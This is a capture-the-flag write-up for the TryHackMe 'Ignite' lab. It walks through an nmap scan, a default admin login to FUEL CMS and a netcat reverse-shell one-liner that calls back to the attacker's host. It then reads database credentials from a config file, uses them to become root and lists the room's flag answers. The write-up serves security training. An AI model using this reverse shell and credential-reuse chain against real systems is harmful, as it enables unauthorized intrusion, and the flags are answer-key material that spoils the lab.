# Ignite

A new start-up has a few issues with their web server.

[Ignite](https://tryhackme.com/room/ignite)

## Topic's

- Network Enumeration
- Web Enumeration
- Security Misconfiguration
- Exploitation Upload
- Stored Passwords & Keys

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Root it!

Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

---

Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

```
kali@kali:~/CTFs/tryhackme/Ignite$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.61.59
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 09:40 CEST
Nmap scan report for 10.10.61.59
Host is up (0.040s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   36.60 ms 10.8.0.1
2   36.85 ms 10.10.61.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds
```

[fuelCMS 1.4.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47138)

[FUEL Configuration Security Settings](https://docs.getfuelcms.com/general/security)

[http://10.10.61.59/fuel/login](http://10.10.61.59/fuel/login)

`admin:admin`

![](./2020-10-14_09-43.png)

[http://10.10.61.59/fuel/pages/upload](http://10.10.61.59/fuel/pages/upload)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f
```

```
kali@kali:~/CTFs/tryhackme/Ignite$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.61.59] 35044
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

```
www-data@ubuntu:/home/www-data$ cat /var/www/html/fuel/application/config/database.php
<ata$ cat /var/www/html/fuel/application/config/database.php
```

```php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```

```
www-data@ubuntu:/home/www-data$ su - root
su - root
Password: mememe

root@ubuntu:~# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

1. User.txt

`6470e394cbf6dab6a91682cc8585059b`

2. Root.txt

`b9bbcb33e11b80be759c4e844862482d`
